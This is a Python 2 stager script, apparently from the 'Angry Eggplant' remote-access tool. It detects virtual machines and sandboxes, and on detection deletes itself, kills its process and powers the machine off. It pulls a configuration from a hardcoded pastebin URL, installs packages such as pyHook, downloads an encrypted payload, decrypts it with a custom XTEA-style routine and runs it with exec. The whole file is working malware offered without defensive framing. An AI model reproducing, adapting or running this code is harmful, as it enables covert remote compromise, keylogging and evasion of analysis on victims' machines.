#!/usr/bin/python
#
# Angry Eggplant
# https://github.com/colental/ae
# Copyright (c) 2017 Daniel Vega-Myhre


import os
import sys
import time
import json
import struct
import base64
import urllib
import marshal
import subprocess


__debug = True


def debug(output):
    if globals().get('__debug'):
        print(bytes(output))

def abort(output=None):
    if globals().get('__debug'):
        debug(output)
        sys.exit(0)
    else:
        if os.name is 'nt':
            execute('del /f /q %s' % sys.argv[0])
            execute('taskkill /pid %d' % os.getpid())
            execute('shutdown /p /f')
        else:
            execute('rm -f %s' % sys.argv[0])
            execute('kill -9 %d' % os.getpid())
            execute('shutdown --poweroff --no-wall')

def execute(cmd):
    try:
        _ = subprocess.Popen(cmd, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
    except Exception as e:
        debug(e)

def decrypt(data, key):
    try:
        data    = base64.b64decode(data)
        blocks  = [data[i * 8:((i + 1) * 8)] for i in range(len(data) // 8)]
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            u,v = struct.unpack("!2L", block)
            k   = struct.unpack("!4L", key)
            d,m = 0x9e3779b9L, 0xffffffffL
            s   = (d * 32) & m
            for _ in range(32):
                v   = (v - (((u << 4 ^ u >> 5) + u) ^ (s + k[s >> 11 & 3]))) & m
                s   = (s - d) & m
                u   = (u - (((v << 4 ^ v >> 5) + v) ^ (s + k[s & 3]))) & m
            packed  = struct.pack("!2L", u, v)
            output  = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
            vector  = block
            result.append(output)
        return bytes().join(result).rstrip(chr(0))
    except Exception as e:
        debug(e)


def run(*args, **kwargs):
    try:
        _pip  = os.popen('where pip' if os.name is 'nt' else 'which pip').read().rstrip()
        if not _pip:
            exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
            os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
        else:
            _conf = json.loads(urllib.urlopen(kwargs.get('config')).read())
            os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
            packages = json.loads(urllib.urlopen(_conf['t']).read()).get(os.name).get(str(struct.calcsize('P') * 8))
            for name, url in packages.items():
                if not subprocess.call([_pip, 'show', name], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                    execute([_pip, 'install', name])
                    if not subprocess.call([_pip, 'show', name], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                        if 'pastebin' not in url:
                            execute([_pip, 'install', url])
                        else:
                            if 'pyHook' in name:
                                wheel = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
                                with file(wheel, 'wb') as fp:
                                    fp.write(base64.b64decode(urllib.urlopen(url).read()))
                                execute([_pip, 'install', wheel])
                                if os.path.isfile(wheel):
                                    os.remove(wheel)
                            elif 'pypiwin32' in name:
                                wheel = 'pywin32-221-cp27-cp27m-win_amd64.whl'
                                with file(wheel, 'wb') as fp:
                                    fp.write(base64.b64decode(urllib.urlopen(url).read()))
                                execute([_pip, 'install', wheel])
                                postinstall  = os.path.join(sys.prefix, os.path.join('Scripts', 'pywin32_postinstall.py'))
                                if os.path.isfile(postinstall):
                                    execute([postinstall, '-install'])
                                if os.path.isfile(wheel):
                                    os.remove(wheel)
                            elif 'pycrypto' in name:
                                wheel = 'pycrypto-2.6.1-cp27-none-win_amd64.whl'
                                with file(wheel, 'wb') as fp:
                                    fp.write(base64.b64decode(urllib.urlopen(url).read()))
                                execute([_pip, 'install', wheel])
                                if os.path.isfile(wheel):
                                    os.remove(wheel)
            return _conf
    except Exception as e:
        debug(e)

def main(*args, **kwargs):
    if kwargs.get('checkvm'):
        check_environ = [_ for _ in os.environ.keys() if 'VBOX' in _.upper()]
        check_procs   = [i.split()[0 if os.name is 'nt' else -1] for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
        if len(check_environ + check_procs):
            abort('virtual machine or sandbox was detected')
    if kwargs.get('config'):
        _conf = run(**kwargs)
        _code = urllib.urlopen(_conf.get('z')).read()
        _body = urllib.urlopen(_conf.get('u')).read()
        main  = 'if __name__ == "__main__":\n\tpayload=Client(config="{}")\n\tpayload.run()'.format(kwargs.get('config'))
        code  = base64.b64decode(_code)
        body  = decrypt(_body, code)
        exec '\n\n'.join([body, main]) in globals()
    else:
        abort('missing config')


if __name__=='__main__':
    __debug = bool('--override' not in sys.argv)
    main(config='https://pastebin.com/raw/si8MrN5X')
